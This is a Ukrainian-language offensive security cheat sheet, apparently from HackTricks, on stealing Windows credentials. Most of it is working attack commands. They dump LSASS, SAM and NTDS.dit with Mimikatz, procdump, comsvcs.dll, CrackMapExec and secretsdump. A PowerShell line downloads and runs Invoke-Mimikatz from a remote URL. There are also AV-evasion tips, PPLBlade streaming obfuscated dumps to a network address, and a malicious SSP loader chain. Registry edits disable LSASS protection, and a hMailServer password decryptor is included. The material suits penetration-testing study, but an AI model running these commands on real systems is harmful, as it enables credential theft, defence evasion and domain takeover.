# Викрадення Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості, які Mimikatz може виконувати на** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі захисти credentials тут.**](credentials-protections.md) **Ці захисти можуть перешкодити Mimikatz витягти деякі credentials.**

## Credentials за допомогою Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати passwords і hashes** всередині жертви.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
Ви можете використати цей інструмент, щоб **dump the lsass process**, **download the dump** та **extract** **credentials locally** from the dump.

Ви також можете використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Деякі **AV** можуть **вважати** використання **procdump.exe to dump lsass.exe** за **шкідливе**, це тому, що вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тож **більш приховано** буде **передати** як **аргумент** **PID** процесу lsass.exe до procdump **замість** **імені lsass.exe.**

### Створення дампа lsass за допомогою **comsvcs.dll**

DLL під назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі аварії. Цей DLL містить **функцію** під назвою **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій розбивається на три компоненти. Ідентифікатор процесу для дампа є першою компонентою, місце розташування файлу дампа — другою, а третьою компонентою має бути строго слово **full**. Інших варіантів немає.\
Після розбору цих трьох компонент DLL генерує файл дампа й записує в нього пам'ять вказаного процесу.\
Використання **comsvcs.dll** підходить для дампу процесу lsass, що усуває потребу в завантаженні та запуску procdump. Цей метод детально описано на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Для виконання використовується така команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Натисніть правою кнопкою на панелі завдань і відкрийте Task Manager
2. Натисніть More details
3. У вкладці Processes знайдіть процес "Local Security Authority Process"
4. Натисніть правою кнопкою на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — підписаний Microsoft бінарник, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для дампінгу Protected Process, який підтримує обфускацію дампів пам'яті та передачу їх на віддалені робочі станції без запису на диск.

**Ключові функції**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon постачає триетапний dumper під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API ніколи не спрацьовують:

1. **Stage 1 loader (`lals.exe`)** – шукає в `fdp.dll` плейсхолдер, що складається з 32 малих символів `d`, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає запатчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це примушує **LSASS** завантажити шкідливий DLL як новий Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – коли **LSASS** завантажує `nfdp.dll`, DLL читає `rtu.txt`, XORs each byte with `0x20`, і відображає декодований blob у пам'ять перед передачею виконання.
3. **Stage 3 dumper** – замаплений payload повторно реалізовує логіку MiniDump, використовуючи direct syscalls, вирішені з хешованих імен API (seed = 0xCD7815D6; h ^= (ch + ror32(h,8))). Виділений експорт з іменем `Tom` відкриває `%TEMP%\<pid>.ddt`, стрімить стиснений дамп **LSASS** у файл і закриває хендл, щоб ексфільтрація могла відбутися пізніше.

Operator notes:

* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll`, та `rtu.txt` в одному каталозі. Stage 1 перезаписує жорстко закодований плейсхолдер абсолютним шляхом до `rtu.txt`, тому розподіл файлів порушить ланцюжок.
* Реєстрація відбувається шляхом додавання `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете задати це значення самостійно, щоб **LSASS** перезавантажував SSP при кожному boot.
* Файли `%TEMP%\*.ddt` — це стиснені дампи. Розпакуйте локально, а потім підгодуйте їх до Mimikatz/Volatility для витягання облікових даних.
* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб `AddSecurityPackageA` пройшов успішно; після повернення виклику **LSASS** прозоро завантажує зловмисний SSP і виконує Stage 2.
* Видалення DLL з диска не евіктує його з **LSASS**. Або видаліть запис у реєстрі й перезапустіть **LSASS** (reboot), або залиште його для довготривалої персистентності.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Вивантаження секретів LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump історії паролів NTDS.dit з цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM_. Але **ви не можете просто скопіювати їх звичайним способом**, бо вони захищені.

### From Registry

Найпростіший спосіб отримати ці файли — скопіювати їх із реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ті файли на вашу машину Kali та **витягніть hashes** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Ви можете виконати копіювання захищених файлів за допомогою цієї служби. Потрібні права Administrator.

#### Using vssadmin

Виконуваний файл vssadmin доступний лише у версіях Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але те саме можна зробити з **Powershell**. Ось приклад **як скопіювати файл SAM** (використовується диск "C:" і він збережений у C:\users\Public) але ви можете використовувати це для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Код з книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Нарешті, ви також можете використовувати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) для створення копії SAM, SYSTEM та ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**, містить критичні дані про об'єкти користувачів, групи та їх членства. Саме тут зберігаються **хеші паролів** для доменних користувачів. Цей файл — база даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Data Table**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
- **Link Table**: Вона відстежує зв'язки, наприклад членства в групах.
- **SD Table**: Тут зберігаються **security descriptors** для кожного об'єкта, забезпечуючи безпеку та контроль доступу до збережених об'єктів.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і він використовується процесом _lsass.exe_. Тоді частина файлу **NTDS.dit** може перебувати всередині пам'яті `lsass` (можна знайти останні звернені дані, ймовірно через покращення продуктивності за рахунок використання **кешу**).

#### Decrypting the hashes inside NTDS.dit

Хеш зашифрований 3 рази:

1. Розшифрувати Password Encryption Key (**PEK**) за допомогою **BOOTKEY** та **RC4**.
2. Розшифрувати сам **хеш** за допомогою **PEK** та **RC4**.
3. Розшифрувати **хеш** за допомогою **DES**.

**PEK** має те саме значення на **кожному domain controller**, але він **зашифрований** всередині файлу **NTDS.dit** з використанням **BOOTKEY** файлу **SYSTEM** контролера домену (BOOTKEY відрізняється між контролерами домену). Саме тому, щоб отримати облікові дані з файлу NTDS.dit, **вам потрібні файли NTDS.dit та SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Доступно з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати трюк [**volume shadow copy**](#stealing-sam-and-system) для копіювання файлу **ntds.dit**. Пам'ятайте, що вам також потрібна копія файлу **SYSTEM** (знову ж, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) трюк).

### **Витягування хешів з NTDS.dit**

Після того як ви **одержали** файли **NTDS.dit** та **SYSTEM**, ви можете використовувати такі інструменти, як _secretsdump.py_, щоб **витягти хеші**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **витягти їх автоматично** використовуючи дійсного domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Також можна використовувати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Експорт об'єктів домену з NTDS.dit у базу даних SQLite**

Об'єкти NTDS можна експортувати в базу даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Експортуються не лише секрети, а й самі об'єкти та їхні атрибути для подальшого аналізу інформації, коли сирий файл NTDS.dit вже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive є необов'язковим, але дозволяє розшифровувати секрети (NT & LM hashes, supplemental credentials такі як cleartext passwords, kerberos або trust keys, NT & LM password histories). Разом з іншою інформацією витягуються такі дані: user and machine accounts з їхніми hashes, UAC flags, timestamp останнього logon та зміни password, опис accounts, імена, UPN, SPN, groups та recursive memberships, дерево organizational units та членство, trusted domains з типом trust, напрямком і атрибутами...

## Lazagne

Завантажте binary з [here](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей binary для витягнення credentials із кількох програм.
```
lazagne.exe all
```
## Інші інструменти для витягання облікових даних з SAM та LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для витягання облікових даних з пам'яті. Завантажити його можна за адресою: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Витягує облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягти credentials з SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Видобування даних з неактивних RDP-сесій та послаблення заходів безпеки

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### Збір телеметрії в стилі DumpRDPHistory

* **Outbound RDP targets** – аналізуйте кожен user hive у `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підключ зберігає назву сервера, `UsernameHint`, та мітку часу останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – опитуйте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` для Event IDs **21** (успішний вхід) та **25** (відключення), щоб визначити, хто адміністрував машину:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Після того як ви дізналися, який Domain Admin регулярно підключається, вилийте LSASS (with LalsDumper/Mimikatz) поки їхня **відключена** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier and tokens у LSASS, які потім можна відтворити по SMB/WinRM, щоб отримати `NTDS.dit` або встановити persistence на domain controllers.

### Registry downgrades targeted by FinalDraft

The same implant also tampers with several registry keys to make credential theft easier:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Встановлення `DisableRestrictedAdmin=1` змушує повне повторне використання облікових даних/квитків під час RDP, що дає можливість pivots у стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тож локальні адміністратори отримують необмежені токени по мережі.
* `DSRMAdminLogonBehavior=2` дозволяє адміністратору DSRM увійти, поки DC онлайн, що дає нападникам ще один вбудований обліковий запис з високими привілеями.
* `RunAsPPL=0` знімає захист LSASS PPL, роблячи доступ до пам'яті тривіально простим для дамперів, таких як LalsDumper.

## Облікові дані бази даних hMailServer (після компрометації)

hMailServer зберігає свій пароль DB в `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` під `[Database] Password=`. Значення зашифроване Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і зі свопами ендінності по 4-байтових словах. Використайте шістнадцятковий рядок з INI разом із цим Python-сніпетом:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Маючи clear-text password, скопіюйте SQL CE database, щоб уникнути блокувань файлів, завантажте 32-bit provider і при необхідності оновіть перед querying hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Стовпець `accountpassword` використовує формат хешу hMailServer (hashcat mode `1421`). Розкриття цих значень може надати повторно використовувані облікові дані для WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Деякі інструменти захоплюють **паролі в відкритому вигляді при логоні** шляхом перехоплення LSA logon callback `LsaApLogonUserEx2`. Ідея полягає в тому, щоб hook-нути або обернути callback пакета автентифікації так, щоб облікові дані фіксувалися **під час логону** (до хешування), а потім записувалися на диск або поверталися оператору. Зазвичай це реалізовано як helper, який інжектиться в LSA або реєструється в ньому, після чого фіксує кожну успішну interactive/network logon подію з username, domain і password.

Operational notes:
- Requires local admin/SYSTEM to load the helper in the authentication path.
- Captured credentials appear only when a logon occurs (interactive, RDP, service, or network logon depending on the hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає інформацію про збережені підключення у файлі `sqlstudio.bin` для кожного користувача. Спеціалізовані dumpers можуть розпарсити файл і відновити збережені SQL облікові дані. У shell-ах, які повертають лише вивід команд, файл часто ексфільтрують, кодувавши його в Base64 і виводячи в stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
На боці оператора перебудуйте файл і запустіть dumper локально, щоб відновити облікові дані:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Посилання

- [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
